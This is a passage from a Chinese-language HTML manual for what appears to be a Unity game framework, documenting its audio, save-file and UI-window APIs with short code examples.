<span class="hljs-attr">AudioSystem.GlobalVolume</span> = <span class="hljs-number">0.5</span>f<span class="hljs-comment">;</span>
//背景音乐音量(float,0~1)，音量设定为50%
<span class="hljs-attr">AudioSystem.BGVolume</span> = <span class="hljs-number">0.5</span>f<span class="hljs-comment">;</span>
//特效音乐音量(flaot,0~1)
<span class="hljs-attr">AudioStystem.EffectVolume</span> = <span class="hljs-number">0.5</span>f<span class="hljs-comment">;</span>
//是否全局静音(bool),true则静音
<span class="hljs-attr">AudioSystem.IsMute</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
//背景音乐是否循环,true则循环
<span class="hljs-attr">AudioSystem.IsLoop</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
//背景音乐是否暂停，true则暂停
<span class="hljs-attr">AudioSystem.IsPause</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>GlobalVolume是全局音量，同时影响背景、特效音乐音量。</li>
<li>BGVolume是背景音乐音量</li>
<li>EffectVolume是特效音乐音量。</li>
<li>IsMute控制全局音量是否静音。</li>
<li>IsLoop控制背景音乐是否循环。</li>
<li>IsPause控制背景音乐是否暂停。</li>
</ul>
<p>支持通过面板更新音量属性。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a71a23e9bd8742c895db54508fe20d37~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=gXpum3ViFvKvcAi%2Fs5g7SWZkY0M%3D" alt="alt" loading="lazy"/>​</p>
<h3 data-id="heading-50">播放背景音乐</h3>
<pre><code class="hljs language-ini" lang="ini">//API
//播放背景音乐
//(AudioClip clip, bool <span class="hljs-attr">loop</span> = <span class="hljs-literal">true</span>, float volume = -<span class="hljs-number">1</span>, float fadeOutTime = <span class="hljs-number">0</span>, float fadeInTime = <span class="hljs-number">0</span>)
AudioSystem.PlayBGAudio(clip, loop, volume, fadeOutTime, fadeInTime)<span class="hljs-comment">;</span>
//轮播多个背景音乐
//(AudioClip<span class="hljs-section">[]</span> clips, float <span class="hljs-attr">volume</span> = -<span class="hljs-number">1</span>, float fadeOutTime = <span class="hljs-number">0</span>, float fadeInTime = <span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
AudioSystem.PlayBGAudioWithClips(clips, volume, fadeOutTime, fadeInTime)<span class="hljs-comment">;</span>
//停止当前背景音乐
AudioSystem.StopBGAudio()<span class="hljs-comment">;</span>
//暂停当前背景音乐
AudioSystem.PauseBGAudio()<span class="hljs-comment">;</span>
//取消暂停当前音乐
AudioSystem.UnPauseBGAudio()<span class="hljs-comment">;</span>


//简单示例
AudioClip <span class="hljs-attr">clip</span> = ResSystem.LoadAsset&lt;AudioClip&gt;(<span class="hljs-string">"music"</span>)<span class="hljs-comment">;</span>
AudioSystem.PlayBGAudio(clip)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>clip是音乐片段，可以传clip数组来轮播音乐。</li>
<li>volume是音乐的音量，不指定则按原来的背景音量。</li>
<li>fadeOutTime是渐出音乐的时间。</li>
<li>fadeInTime是渐入音乐的时间。</li>
<li>停止当前背景音乐会将当前背景音乐置空。</li>
<li>暂停音乐可取消暂停恢复。</li>
</ul>
<h3 data-id="heading-51">播放特效音乐</h3>
<pre><code class="hljs language-ini" lang="ini">//API
//播放一次音效并绑定到游戏物体上，位置随物体变化
//(AudioClip clip, Component <span class="hljs-attr">component</span> = null, bool autoReleaseClip = <span class="hljs-literal">false</span>, float volumeScale = <span class="hljs-number">1</span>, bool is3d = <span class="hljs-literal">true</span>, Action callBack = null)
audioSystem.PlayOneShot(clip, component, autoReleaseClip, volumeScale, is3d, callBack)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip, component, autoReleaseClip, volumeScale, is3d)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip, component, autoReleaseClip, volumeScale)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip, component, autoReleaseClip)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip, component)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip)<span class="hljs-comment">;</span>
//在指定位置上播放一次音效
//(AudioClip clip, Vector3 position, bool <span class="hljs-attr">autoReleaseClip</span> = <span class="hljs-literal">false</span>, float volumeScale = <span class="hljs-number">1</span>, bool is3d = <span class="hljs-literal">true</span>, Action callBack = null)
audioSystem.PlayOneShot(clip, position, autoReleaseClip, volumeScale, is3d, callBack)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip, position, autoReleaseClip, volumeScale, is3d)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip, position, autoReleaseClip, volumeScale)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip, position, autoReleaseClip)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip, position)<span class="hljs-comment">;</span>
//简单示例
//在玩家位置播放一次音效
AudioClip <span class="hljs-attr">clip</span> = ResSystem.LoadAsset&lt;AudioClip&gt;(<span class="hljs-string">"music"</span>)<span class="hljs-comment">;</span>
audioSystem.PlayOneShot(clip,player.transform.position)<span class="hljs-comment">;</span>
//绑定玩家组件播放一次音效（等同于玩家位置）
audioSystem.PlayOneShot(clip,player.transform)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>clip是音乐片段，音效系统中特效音乐在每次播放时优先从对象池中取出挂载了AudioSource的GameObject实例生成并会在音效播放完成后自动回收。</li>
<li>postion是播放的位置，必填。</li>
<li>component是绑定的组件，这个API的目的是让音效随着物体移动一起移动，不填则默认不绑定。</li>
<li>autoReleaseClip代表是否需要在音乐播放结束后自动释放clip资源，Res和Addressable均可。</li>
<li>volumeScle是音乐的音量，不指定默认按最大音量。</li>
<li>is3D是启用空间音效，默认开启。</li>
<li>callBack是回调事件，会在音效播放完执行一个无参无返回值方法。</li>
</ul>
<p>使用Compoent绑定播放音效时，如果绑定物体如果在播放中被销毁了，那么AudioSource会提前解绑避免一同被销毁（通过事件工具提前添加监听），之后播放完毕会自动回收。</p>
<h2 data-id="heading-52">存档系统</h2>
<p>完成对存档的创建，获取，保存，加载，删除，缓存，支持多存档。存档有两类，一类是用户型存档，存储着某个游戏用户具体的信息，如血量，武器，游戏进度，一类是设置型存档，与任何用户存档都无关，是通用的存储信息，比如屏幕分辨率、音量设置等。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/caa95c4bc8454184a223045a0b16c964~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=prHLWTjLI8J3E3PTTI3lnjYqdPA%3D" alt="alt" loading="lazy"/>​</p>
<p>存档系统支持两类本地文件：，两者通过框架设置面板进行切换，切换时，原本地文件存档会清空！二进制流文件可读性较差不易修改，Json可读性较强，易修改，存档的数据存在Application.persistentDataPath下。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa0107b375cd4eea85de63e6e2430a87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=c1TkfekCJSuK%2Bn8o7DSU2BqfW1Y%3D" alt="alt" loading="lazy"/>​</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58bd332ddec34c6c8511e0bc87defbe0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=5Qtm8amFhOUN9DZYaIGsikBbyV8%3D" alt="alt" loading="lazy"/>​</p>
<p>SaveData和setting分别存储用户存档和设置型存档。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac3530badaf54138a327438b2b123a04~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=M5QKah7CPB%2FEJwN6a3Q%2B1xZhELE%3D" alt="alt" loading="lazy"/>​</p>
<p>用户存档下根据saveID分成若干文件夹用于存储具体的对象。</p>
<h3 data-id="heading-53">设置型存档</h3>
<p>设置存档实际就是一个全局唯一的存档，可以向其中存储全局通用数据。</p>
<h4 data-id="heading-54">保存设置</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//保存设置到全局存档</span>
<span class="hljs-comment">//(object saveObject, string fileName)</span>
SaveSystem<span class="hljs-selector-class">.SaveSetting</span>(saveObject, fileName);
SaveSystem<span class="hljs-selector-class">.SaveSetting</span>(saveObject)
<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">//见下一小节结合加载说明</span>
</code></pre>
<ul>
<li>saveObject是要保存的对象，System.Object类型。</li>
<li>fileName是保存的文件名称，不填默认取saveObject的类型名。</li>
</ul>
<h4 data-id="heading-55">加载设置</h4>
<pre><code class="hljs language-ini" lang="ini">///API
//从设置存档中加载设置
// string fileName
SaveSystem.LoadSetting&lt;T&gt;(fileName)<span class="hljs-comment">;</span>
SaveSystem.LoadSetting&lt;T&gt;()<span class="hljs-comment">;</span>


//简单示例
// GameSetting类中存储着游戏名称，作为全局数据
<span class="hljs-section">[Serializable]</span>
public class GameSetting
{
    public string gameName<span class="hljs-comment">;</span>
}
GameSetting <span class="hljs-attr">gameSetting</span> = new GameSetting()<span class="hljs-comment">;</span>
<span class="hljs-attr">gameSetting.gameName</span> = <span class="hljs-string">"测试"</span><span class="hljs-comment">;</span>
//保存设置
SaveSystem.SaveSetting(gameSetting)<span class="hljs-comment">;</span>
//取出来用
String <span class="hljs-attr">gameName</span> = SaveSystem.LoadSetting&lt;gameSetting&gt;().gameName<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-56">删除设置</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//删除用户存档和设置存档</span>
SaveSystem<span class="hljs-selector-class">.DeleteAll</span>();
</code></pre>
<ul>
<li>fileName是加载设置存档的文件名，T限定了所存储的数据类型，不填fileName则默认以T的类型名作为文件名加载。</li>
</ul>
<h3 data-id="heading-57">用户存档</h3>
<p>用户存档与具体的用户相关，不同用户存档位置不同，数据也不同，索引为SaveID。</p>
<h4 data-id="heading-58">创建用户存档</h4>
<p>创建的存档索引默认自增。</p>
<pre><code class="hljs language-ini" lang="ini">//API
SaveSystem.CreateSaveItem()<span class="hljs-comment">;</span>


//简单示例
SaveItem <span class="hljs-attr">saveItem</span> = SaveSystem.CreateSaveItem()<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-59">获取用户存档</h4>
<h5 data-id="heading-60">存档层面</h5>
<h6 data-id="heading-61">获取所有用户存档</h6>
<p>根据一定规则获取所有用户存档，返回List。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//最新的在最后面</span>
SaveSystem<span class="hljs-selector-class">.GetAllSaveItem</span>();
<span class="hljs-comment">//最近创建的在最前面</span>
SaveSystem<span class="hljs-selector-class">.GetAllSaveItemByCreatTime</span>();
<span class="hljs-comment">//最近更新的在最前面</span>
SaveSystem<span class="hljs-selector-class">.GetAllSaveItemByUpdateTime</span>();
<span class="hljs-comment">//万能解决方案，自定义规则</span>
GetAllSaveItem&lt;T&gt;(Func&lt;SaveItem, T&gt; orderFunc, bool isDescending = false)


<span class="hljs-comment">//简单示例,万能方案，按照SaveID倒序获得存档</span>
GameSetting gameSetting = new <span class="hljs-built_in">GameSetting</span>();
List&lt;SaveItem&gt; testList = SaveSystem<span class="hljs-selector-class">.GetAllSaveItem</span>&lt;int&gt;(oderFunc, true);
<span class="hljs-comment">//List&lt;SaveItem&gt; testList = SaveSystem.GetAllSaveItem();</span>
foreach (var item in testList)
{
    Debug<span class="hljs-selector-class">.Log</span>(item.saveID);
}
<span class="hljs-comment">//排序依据Func</span>
int <span class="hljs-built_in">oderFunc</span>(SaveItem item)
{
    return item<span class="hljs-selector-class">.saveID</span>;
}
</code></pre>
<ul>
<li>提供多种重载方法获取存档List。</li>
<li>支持自定义排序依据的万解决方案，T传比较参数类型，orderFunc传比较方法。</li>
</ul>
<h6 data-id="heading-62">获取某一项用户存档</h6>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//(int id, SaveItem saveItem)</span>
SaveSystem<span class="hljs-selector-class">.GetSaveItem</span>(id);
SaveSystem<span class="hljs-selector-class">.GetSaveItem</span>(saveItem);


<span class="hljs-comment">//简单示例</span>
SaveItem saveItem = SaveSystem<span class="hljs-selector-class">.CreateSaveItem</span>();
SaveSystem<span class="hljs-selector-class">.GetSaveItem</span>(saveItem);
</code></pre>
<ul>
<li>id是用户存档的编号，存档系统会在创建时指定默认ID，使用时透明，因此推荐使用saveItem传参，saveItem是可维护的。</li>
</ul>
<h5 data-id="heading-63">删除用户存档</h5>
<h6 data-id="heading-64">删除所有用户存档</h6>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//删除所有用户存档</span>
SaveSystem<span class="hljs-selector-class">.DeleteAllSaveItem</span>();
</code></pre>
<h6 data-id="heading-65">删除某一项用户存档</h6>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//(int id, SaveItem saveItem)</span>
SaveSystem<span class="hljs-selector-class">.DeleteSaveItem</span>(id);
SaveSystem<span class="hljs-selector-class">.DeleteSaveItem</span>(saveItem);


<span class="hljs-comment">//简单示例</span>
SaveItem saveItem = SaveSystem<span class="hljs-selector-class">.CreateSaveItem</span>();
SaveSystem<span class="hljs-selector-class">.DeleteSaveItem</span>(saveItem);
</code></pre>
<ul>
<li>id是用户存档的编号，存档系统会在创建时指定默认ID，使用时透明，因此推荐使用saveItem传参，saveItem是可维护的。</li>
</ul>
<h4 data-id="heading-66">存档对象层面</h4>
<h5 data-id="heading-67">保存用户存档中某一对象</h5>
<pre><code class="hljs language-ini" lang="ini">//API
//(object saveObject, string saveFileName, SaveItem saveItemint, <span class="hljs-attr">saveID</span> = <span class="hljs-number">0</span>)
SaveSystem.SaveObject(saveObject, saveFileName, saveID)<span class="hljs-comment">;</span>
SaveSystem.SaveObject(saveObject, saveFileName, saveItem)<span class="hljs-comment">;</span>
SaveSystem.SaveObject(saveObject, saveID)<span class="hljs-comment">;</span>
SaveSystem.SaveObject(saveObject, saveItem)<span class="hljs-comment">;</span>


//简单示例
SaveItem <span class="hljs-attr">saveItem</span> = SaveSystem.CreateSaveItem()<span class="hljs-comment">;</span>
GameSetting <span class="hljs-attr">gameSetting</span> = new GameSetting()<span class="hljs-comment">;</span>
SaveSystem.SaveObject(gameSetting, saveItem)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>saveObject是要保存的对象。</li>
<li>saveFileName是保存后生成的本地文件名（对象会单独作为一个文件存储在对应saveID的文件夹下），不填则以对象的类型名为文件名。</li>
<li>saveID/SaveItem是对象存储的存档。</li>
<li>保存对象时会更新用户存档缓存。</li>
</ul>
<h5 data-id="heading-68">获取用户存档中某一对象</h5>
<pre><code class="hljs language-ini" lang="ini">//API
//(string saveFileName, SaveItem saveItem, int <span class="hljs-attr">saveID</span> = <span class="hljs-number">0</span>)
SaveSystem.LoadObject&lt;T&gt;(saveFileName, saveID)<span class="hljs-comment">;</span>
SaveSystem.LoadObject&lt;T&gt;(saveFileName, saveItem)<span class="hljs-comment">;</span>
SaveSystem.LoadObject&lt;T&gt;(saveID)<span class="hljs-comment">;</span>
SaveSystem.LoadObject&lt;T&gt;(saveItem)<span class="hljs-comment">;</span>


//简单示例
SaveItem <span class="hljs-attr">saveItem</span> = SaveSystem.CreateSaveItem()<span class="hljs-comment">;</span>
GameSetting <span class="hljs-attr">gameSetting</span> = new GameSetting()<span class="hljs-comment">;</span>
SaveSystem.SaveObject(gameSetting, saveItem)<span class="hljs-comment">;</span>
GameSetting <span class="hljs-attr">gameSetting</span> = SaveSystem.LoadObject&lt;GameSetting&gt;(saveItem)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>T指定获取对象类型。</li>
<li>saveFileName是获取对象的文件名，不填则默认以T的类型名作为文件名。</li>
<li>saveID/SaveItem是对象存储的存档。</li>
<li>获取对象优先从缓存中读取，不存在则IO读文件获取，并加入缓存。</li>
</ul>
<h5 data-id="heading-69">删除用户存档中某一对象</h5>
<pre><code class="hljs language-ini" lang="ini">//API
//(string saveFileName, SaveItem saveItem, int <span class="hljs-attr">saveID</span> = <span class="hljs-number">0</span>)
SaveSystem.DeleteObject&lt;T&gt;(saveFileName, saveID)<span class="hljs-comment">;</span>
SaveSystem.DeleteObject&lt;T&gt;(saveFileName, saveItem)<span class="hljs-comment">;</span>
SaveSystem.DeleteObject&lt;T&gt;(saveID)<span class="hljs-comment">;</span>
SaveSystem.DeleteObject&lt;T&gt;(saveItem)<span class="hljs-comment">;</span>


//简单示例
SaveItem <span class="hljs-attr">saveItem</span> = SaveSystem.CreateSaveItem()<span class="hljs-comment">;</span>
GameSetting <span class="hljs-attr">gameSetting</span> = new GameSetting()<span class="hljs-comment">;</span>
SaveSystem.DeleteObject(gameSetting, saveItem)<span class="hljs-comment">;</span>
GameSetting <span class="hljs-attr">gameSetting</span> = SaveSystem.DeleteObject&lt;GameSetting&gt;(saveItem)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>T指定获取对象类型。</li>
<li>saveFileName是获取对象的文件名，不填则默认以T的类型名作为文件名。</li>
<li>saveID/SaveItem是对象存储的存档。</li>
<li>删除某一对象时，如果存在对应的缓存，则一并删除。</li>
</ul>
<h5 data-id="heading-70">注意</h5>
<p>在从用户存档中取出对象时，底层优先从缓存中读取，避免读时IO，使用时无需关注。</p>
<h3 data-id="heading-71">序列化字典，vector，color</h3>
<p>框架提供了字典的二进制序列化方法以进行存档，给字典包了一层壳，在序列化和反序列化时自动拆分成List存储、组合成Dictionary使用。同时将Color，vector2，vector3单独封装成结构体进行存储，舍弃掉Unity数据类型中自带的额外方法和属性，只保留rgba和xyz坐标。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">//API</span>
Vector3 <span class="hljs-punctuation">-&gt;</span> Serialized_Vector3
Vector2 <span class="hljs-punctuation">-&gt;</span> Serialized_Vector2
Color <span class="hljs-punctuation">-&gt;</span> Serialized_Color
Dictionary<span class="hljs-punctuation">-&gt;</span>Serialized_Dic
</code></pre>
<p>在使用时，将原先定义字典等数据的语句关键字进行替换即可，框架重载了赋值运算符，构造函数以及类型转换方法，使得序列化的数据类型可以自动跟原生的Vector2，Vector3，Vector2Int，Vector3Int，Color互转，在使用体验上与原生的关键词无异。</p>
<h2 data-id="heading-72">UI框架</h2>
<p>UI框架实现对窗口的生命周期管理，层级遮罩管理，按键物理响应等功能，对外提供窗口的打开、关闭、窗口复用API，对内优化好窗口的缓存、层级问题，能够和场景加载、事件系统联动，将Model、View、Controller完全解耦。通过与配置系统、脚本可视化合作，实现新UI窗口对象的快速开发和已有UI窗口的方便接入。</p>
<h3 data-id="heading-73">数据结构</h3>
<p>虽然本文档使用手册，但为了便于上手理解，简单对UI框架的数据结构进行解释。</p>
<pre><code class="hljs language-csharp" lang="csharp">    <span class="hljs-comment">//UI窗口数据字典</span>
    Dictionary&lt;<span class="hljs-built_in">string</span>, UIWindowData&gt; UIWindowDataDic;


    <span class="hljs-comment">//UI窗口数据类</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">UIWindowData</span>
    {
        [<span class="hljs-meta">LabelText(<span class="hljs-string">"是否需要缓存"</span>)</span>] <span class="hljs-keyword">public</span> <span class="hljs-built_in">bool</span> isCache;
        [<span class="hljs-meta">LabelText(<span class="hljs-string">"预制体Path或AssetKey"</span>)</span>] <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> assetPath;
        [<span class="hljs-meta">LabelText(<span class="hljs-string">"UI层级"</span>)</span>] <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> layerNum;
        <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
        <span class="hljs-comment"><span class="hljs-doctag">///</span> 这个元素的窗口对象</span>
        <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
        [<span class="hljs-meta">LabelText(<span class="hljs-string">"窗口实例"</span>)</span>] <span class="hljs-keyword">public</span> UI_WindowBase instance;


        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">UIWindowData</span>(<span class="hljs-params"><span class="hljs-built_in">bool</span> isCache, <span class="hljs-built_in">string</span> assetPath, <span class="hljs-built_in">int</span> layerNum</span>)</span>
        {
            <span class="hljs-keyword">this</span>.isCache = isCache;
            <span class="hljs-keyword">this</span>.assetPath = assetPath;
            <span class="hljs-keyword">this</span>.layerNum = layerNum;
            instance = <span class="hljs-literal">null</span>;
        }
    }
</code></pre>
<p>UI框架的核心在于维护字典UIWindowDataDic，通过windowKey索引了不同的UI窗口数据UiWindowData，其中包含了窗口是否要缓存，资源路径，UI层级，以及窗口类实例（脚本作为窗口对象的组件，持有他就相当于持有了窗口gameObject），UIWindowData可以通过运行时动态加载也可以在Editor时通过特性静态加载，设计windowKey的原因是如果不额外标定windowKey直接用资源路径作为索引，则同一个窗口资源无法复用，换句话说，同一个UI窗口游戏对象及窗口类，通过不同的windowKey和实例可以进行重用。</p>
<h3 data-id="heading-74">UI窗口对象及类配置</h3>
<p>使用UI框架需要先为UI窗口游戏对象添加控制类，该类继承自UI_WindowBase,并将UI窗口游戏对象加入Addressable列表/Resources文件夹下。</p>
<h3 data-id="heading-75">UI窗口特性-Editor静态加载</h3>
<p>可以选择为UI窗口类打上UIWindowData特性（Attribute可省略）用于配置数据。<br/>
​<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c86b28037904f318f29cc1edcf6c9a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=bOCfAd7i3%2FPTvBshU9yShSN9s6o%3D" alt="alt" loading="lazy"/>​</p>
<pre><code class="hljs language-go" lang="go">UIWindowDataAttribute(<span class="hljs-type">string</span> windowKey, <span class="hljs-type">bool</span> isCache, <span class="hljs-type">string</span> assetPath, <span class="hljs-type">int</span> layerNum){}
UIWindowDataAttribute(Type <span class="hljs-keyword">type</span>,<span class="hljs-type">bool</span> isCache, <span class="hljs-type">string</span> assetPath, <span class="hljs-type">int</span> layerNum){}
</code></pre>
<ul>
<li>特性中windowKey是UI窗口的名字唯一索引，可以直接传string也可以传Type使用其FullName。</li>
<li>isCache指明UI窗口游戏对象是否需要缓存重用，true则在窗口关闭时不会被销毁，下次使用时可以通过windowKey调用且不需要实例化。</li>
<li>assetPath是资源的路径，在Resources中是UI窗口对象在Resources文件夹下的路径，Addressable中是UI窗口对象的Addressable Name。</li>
<li>layerNum是UI窗口对象的层级，从0开始，越大则越接近顶层。</li>
<li>支持一个窗口类多特性，复用同一份窗口类资源，n个特性，则有n份UI窗口数据，本质上对应了多个windowKey，因此windowKey必须不同。</li>
</ul>
<p>经过配置后，在Editor模式下该UI类特性数据及UI窗口游戏对象（此时还没有实例化为空）会自动保存到GameRoot的配置文件中，即静态加载。</p>
<h3 data-id="heading-76">UI窗口运行时动态加载</h3>
<p>在运行时动态加载UI窗口，不需要给窗口类打特性，窗口数据直接给出，与Onshow/OnClose不同，其不包含窗口游戏物体对象的显示/隐藏/销毁逻辑。</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//(string windowKey, UIWindowData windowData, bool instantiateAtOnce = false)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">AddUIWindowData</span>(windowKey, windowData, instantiateAtOnce);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">AddUIWindowData</span>(windowKey, windowData, instantiateAtOnce);
<span class="hljs-comment">//(Type type, UIWindowData windowData, bool instantiateAtOnce = false)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">AddUIWindowData</span>(type, windowData, instantiateAtOnce);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">AddUIWindowData</span>(type, windowData);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">AddUIWindowData</span>&lt;<span class="hljs-type">T</span>&gt;(windowData, instantiateAtOnce);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">AddUIWindowData</span>&lt;<span class="hljs-type">T</span>&gt;(windowData);


<span class="hljs-comment">//简单实例</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">AddUIWindowData</span>(<span class="hljs-string">"Test1"</span>, new <span class="hljs-type">UIWindowData</span>(<span class="hljs-literal">true</span>, <span class="hljs-string">"TestWindow"</span>, <span class="hljs-number">1</span>));
<span class="hljs-comment">//上一步只添加了数据，显示在面板上还需要激活</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>&lt;<span class="hljs-type">TestWindow</span>&gt;(<span class="hljs-string">"Test1"</span>);
</code></pre>
<ul>
<li>通过泛型T指定UI窗口子类类型，windowKey为UI窗口类的索引，对应UIWindowData中的windowKey，不指定则使用T的类型名作为索引。</li>
<li>instantiateAtOnce指明窗口对象及其类是否要进行实例化，默认为null，会在窗口打开时加载资源进行实例化且设置为不激活，若窗口资源较大，可以提前在动态加载时就进行实例化，如图。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06a22898ef064ab0a2598e4775be4864~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=5uAP%2FtuM1G5QJ6GmnZ7GqFjFp0U%3D" alt="alt" loading="lazy"/>​</p>
<h3 data-id="heading-77">UI窗口数据管理</h3>
<p>获取UI窗口数据，其中包含UI的windowKey，层级，资源路径，以及对象实例，可以对其进行操作。</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">//获取UI窗口数据</span>
<span class="hljs-comment">//(string windowKey) (Type windowType)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">GetUIWindowData</span>(windowKey);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">GetUIWindowData</span>&lt;<span class="hljs-type">T</span>&gt;();
<span class="hljs-type">UISystem</span>.<span class="hljs-type">GetUIWindowData</span>(windowType);
<span class="hljs-comment">//尝试获取UI窗口数据，返回bool</span>
<span class="hljs-comment">//(string windowKey, out UIWindowData windowData</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">TryGetUIWindowData</span>(windowKey, windowData);
<span class="hljs-comment">//移除某条UI窗口数据</span>
<span class="hljs-comment">//(string windowKey, bool destoryWidnow = false)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">RemoveUIWindowData</span>(windowKey, destoryWidnow);
<span class="hljs-comment">//清除所有UI窗口数据</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">ClearUIWindowData</span>();


<span class="hljs-comment">//简单实例</span>
<span class="hljs-comment">//获取testWindow的层级</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">GetUIWindowData</span>&lt;testWindow&gt;().layerNum;
</code></pre>
<ul>
<li>通过windowKey/泛型类型名/窗口对象类型传索引。</li>
<li>支持Try方式获取窗口数据，成功返回true并将数据赋给输出参数。</li>
<li>移除UI窗口数据,已存在的窗口对象实例会被强行删除。</li>
</ul>
<h3 data-id="heading-78">UI窗口对象管理</h3>
<p>这里的UI窗口对象只UI窗口数据UIWIndowData持有的那一份窗口脚本对象实例，其生命周期由框架管理，整体分为打开和关闭。</p>
<h4 data-id="heading-79">UI窗口打开</h4>
<p>加载UI窗口对象并显示。</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//返回值为UI窗口类T，T受泛型约束必须为UI窗口基类子类</span>
<span class="hljs-comment">//(string windowKey, int layer = -1)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>&lt;<span class="hljs-type">T</span>&gt;(windowKey, layer);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>&lt;<span class="hljs-type">T</span>&gt;(windowKey);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>&lt;<span class="hljs-type">T</span>&gt;(layer);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>&lt;<span class="hljs-type">T</span>&gt;();
<span class="hljs-comment">//返回值为UI_WindowBase类，对应不能确定窗口类型的情况, xx是窗口类的对象</span>
<span class="hljs-comment">//(Type type, int layer = -1)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>(xx.getType(), layer);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>(xx.getType());
